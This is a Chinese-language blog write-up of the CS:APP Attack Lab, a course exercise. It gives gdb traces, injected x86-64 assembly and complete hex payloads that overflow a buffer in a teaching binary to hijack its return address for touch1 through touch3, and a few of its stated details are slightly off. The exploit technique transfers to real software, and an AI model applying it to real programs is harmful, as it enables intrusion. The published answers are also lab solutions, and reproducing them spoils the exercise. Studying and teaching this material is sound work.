---
title: 'CS:APP - Attack Lab 笔记'
date: 2018-08-29 17:48:58
categories:
	- 学习笔记
tags:
	- CSAPP
	- C
	- 学习笔记
---

本次 Lab 是通过利用缓冲区溢出等漏洞来改变代码的行为。

## touch1

touch1 不需要写汇编代码，只要利用一定长度的字符串修改函数的返回地址即可。

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

本来运行完 `getbuf` 函数后函数会返回 `test` 继续运行，但是我们可以通过为 `Gets` 函数提供过长的字符串，以覆盖原来的返回地址。

`getbuf` 函数首先申请了 `0x28 = 40` 字节的空间，假设此时 `$rsp = 0x100`，那么原本的函数返回地址应该在 `$rsp - 0x28` 处，占用 4 个字节。也就是说，如果我们提供 44 个字节长度的字符串，就能成功覆盖原本的函数返回地址。

所以答案应该是（其实不应该有换行的！）：

```markdown
00 00 00 00
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
c0 17 40 00 /* touch1 的入口地址 */
```

## touch2

这是 `touch2` 的源代码，想要正确运行 `touch2`，只覆盖返回地址已经无法完成要求了，因为它需要传入参数 `val`。

```c
void touch2(unsigned val) {
	vlevel = 2;
	/* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

所以，这里我们要写一些汇编代码。把自己的 `cookie` 值传给 `%rdi` 寄存器（一般由它来传参，也可分析 `touch2` 的汇编码），再跳转到 `touch2` 的入口地址。不过要求所有的跳转都有 `ret` 指令，解决方法是先 `push` 入栈，再 `ret` 即可正确跳转。

`touch2.sol.s` 文件的内容如下：

```assembly
movq $0x59b997fa, %rdi   # 我的 cookie
pushq $0x4017ec          # touch2 的入口
ret
```

> r 开头的寄存器都是 64 位的，加后缀的话应该是 q。

命令行中输入以下指令：

```
gcc -c touch2.sol.s
objdump -d touch2.sol.o > touch2.sol.d
```

得到的 `touch2.sol.d` 文件中包含以下内容：

```assembly

touch2.sol.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

现在我们有了攻击代码了，但是怎么把它“注入”到目标程序里呢？

答案是利用栈。

汇编代码其实是对 0 和 1 的抽象，每一条指令的执行其实就是不断读取文件系统中的 0 和 1，并把它们解释成指令。只要我们把上面的 13 个字节写到某个地方，再通过 `touch1` 中的方法，强制跳转到攻击代码的入口处，就能达到目的了。

这里，我们在栈里存放攻击代码（其实我也只知道在栈里存放代码），只要把 `touch1` 中的最后 4 个字节替换成栈中的地址 `addr`，然后把 13 字节的攻击代码放到 `addr` 处，就可能成功过关了。

现在我们来查看一下栈的地址。

```shell
(gdb) disas getbuf 
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.

# 在修改完栈指针 rsp 后设置断点

(gdb) break *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.

# 运行程序

(gdb) run -q < touch2.sol.txt 
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q < touch2.sol.txt
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14	buf.c: 没有那个文件或目录.

# 相看寄存器状态，主要是 rsp 寄存器的

(gdb) info registers 
rax            0x0	0
rbx            0x55586000	1431855104
rcx            0xc	12
rdx            0x7ffff7dd3780	140737351858048
rsi            0xc	12
rdi            0x60601c	6316060
rbp            0x55685fe8	0x55685fe8
rsp            0x5561dc78	0x5561dc78
r8             0x7ffff7fde700	140737354000128
r9             0xc	12
r10            0x4032b4	4207284
r11            0x7ffff7b7f970	140737349417328
r12            0x2	2
r13            0x0	0
r14            0x0	0
r15            0x0	0
rip            0x4017ac	0x4017ac <getbuf+4>
eflags         0x216	[ PF AF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
---Type <return> to continue, or q <return> to quit---q
Quit
```

可以看到 `%rsp` 寄存器的值是 `0x5561dc78`，所以把最后四个字节修改成它就好了。

以下是答案：

```
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

这里我们修改返回地址，这样下一条指令就会是栈顶处的攻击代码，从而完成进入 `touch2` 的准备，并进入 `touch2`。

## touch3

`touch3` 相比更加麻烦了，因为它要求把 `cookie` 以字符串的形式传入，并调用 `hexmatch` 函数进入匹配。而 `hexmatch` 函数在匹配时会修改栈内的数据，这样我们就要小心选择位置来存放 `cookie`。

使用 `man ascii` 在命令行下相看其 `ascii` 编码。

我的是：

```
35 39 62 39 39 37 66 61
```

`touch2 ` 与 `touch3` 有着一些相似性，这里我们先修改一下 `touch2` 的答案，看看情况。

```
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

尝试运行：

```shell
(gdb) run -q -i touch3.sol.r.txt 
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q -i touch3.sol.r.txt
Cookie: 0x59b997fa

Breakpoint 1, 0x000000000040190b in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73	visible.c: 没有那个文件或目录.

# 在调用 hexmatch 前打印栈顶，10 进制形式的

(gdb) x/20w 0x5561dc78
0x5561dc78:	1075378792	49920	0	0
0x5561dc88:	0	0	0	0
0x5561dc98:	0	0	1431855104	0
0x5561dca8:	9	0	4202276	0
0x5561dcb8:	0	0	-185273100	-185273100

# 转化为 16 进制形式的数字

(gdb) print /x 10
$1 = 0xa
(gdb) x/20w 0x5561dc78

# 正是我们的攻击代码，不过是反向存放的
0x5561dc78:	0x4018fa68	0x0000c300	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x00000000	0x00000000	0x55586000	0x00000000
0x5561dca8:	0x00000009	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
(gdb) delete
删除所有断点吗？ (y or n) y

# 调用完 hexmatch 后打印栈顶，查看其修改

(gdb) break *0x401916
Breakpoint 2 at 0x401916: file visible.c, line 73.
(gdb) run -q -i touch3.sol.r.txt 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/cwwang/文档/csapp/lab3/target1/ctarget -q -i touch3.sol.r.txt
Cookie: 0x59b997fa

Breakpoint 2, 0x0000000000401916 in touch3 (
    sval=0x606010 "\210$\255", <incomplete sequence \373>) at visible.c:73
73	in visible.c
(gdb) x/20w 0x5561dc78

# 大概 40 个字节都被修改了
0x5561dc78:	0x383e4500	0xc4aff7fc	0x00606010	0x00000000
0x5561dc88:	0x55685fe8	0x00000000	0x00000004	0x00000000
0x5561dc98:	0x00401916	0x00000000	0x55586000	0x00000000
0x5561dca8:	0x00000009	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
(gdb) 
```

通过上述实验，我们发现大概有 40 个字节被 `hexmatch` 覆盖了，所以 `cookie` 字符串不能放在那里。攻击代码无所谓，因为它们会最先被运行，然后就没有用处了，覆盖也无妨。

在 `0x5561dcb8` 处我们发现有 8 个字节的空间，正好可以放下 `cookie`。

然后就可以写攻击代码了：

```assembly
push $0x4018fa
mov $0x5561dcb8, %rdi
ret
```

最终答案：

```shell
68 fa 18 40  00 48 c7 c7  b8 dc 61 55  c3 00 00 00 # 汇编码
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
00 00 00 00  00 00 00 00  78 dc 61 55  00 00 00 00 # 栈顶
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
35 39 62 39  39 37 66 61                           # cookie
```

